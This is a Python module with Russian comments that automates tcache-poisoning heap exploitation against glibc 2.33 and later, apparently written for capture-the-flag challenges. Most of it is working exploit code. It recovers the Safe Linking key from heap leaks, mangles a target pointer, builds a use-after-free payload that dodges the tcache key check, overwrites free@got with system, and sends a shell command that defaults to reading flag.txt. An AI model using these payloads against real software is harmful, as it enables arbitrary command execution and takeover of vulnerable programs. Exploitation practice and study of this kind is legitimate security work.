"""
Модуль для автоматизации Heap Exploitation (Tcache Poisoning).
Специально разработан для обхода защит glibc 2.33+ (Safe Linking и Tcache Key Check).
"""
import struct
from typing import List

def pack_u64(val: int) -> bytes:
    """Упаковывает целое число в 8-байтовую строку (Little Endian)."""
    return struct.pack("<Q", val)

def find_mangling_key(leaks: List[int]) -> int:
    """
    Находит ключ маскировки tcache (heap_base >> 12).
    В glibc 2.33+ это минимальное значение > 0x1000 среди утечек,
    так как реальные 64-битные адреса кучи огромные, а ключ после сдвига маленький.
    """
    valid_leaks = [x for x in leaks if x > 0x1000]
    if valid_leaks:
        return min(valid_leaks)
    return leaks[0] if leaks else 0

def get_heap_base(mangling_key: int) -> int:
    """Вычисляет base адрес кучи из ключа маскировки."""
    return mangling_key << 12

def mangle_pointer(heap_base: int, target_addr: int) -> int:
    """
    Применяет формулу Safe Linking: fd = (heap_base >> 12) ^ target_addr
    """
    key = heap_base >> 12
    return key ^ target_addr

def generate_tcache_poison_payload(mangled_target: int) -> bytes:
    """
    Генерирует payload для UAF edit, который перезаписывает fd, 
    но прерывает запись байтом \xff ДО поля key (offset 8).
    Это предотвращает abort() в glibc 2.33+ из-за corrupted tcache key!
    """
    return pack_u64(mangled_target) + b'\xff'

def generate_got_overwrite_payload(system_plt: int) -> bytes:
    """
    Генерирует payload для перезаписи free@got.
    Использует \xff на 17-м байте, чтобы не затереть соседние записи GOT (например, printf@got).
    """
    return b'A' * 8 + pack_u64(system_plt) + b'\xff'

def generate_shell_command_payload(cmd: str = "cat flag.txt; exit") -> bytes:
    """
    Генерирует payload команды с нулевым байтом и \xff для безопасного завершения записи.
    """
    cmd_bytes = cmd.encode() + b'\x00'
    padding = b'\xff' * (256 - len(cmd_bytes))
    return cmd_bytes + padding
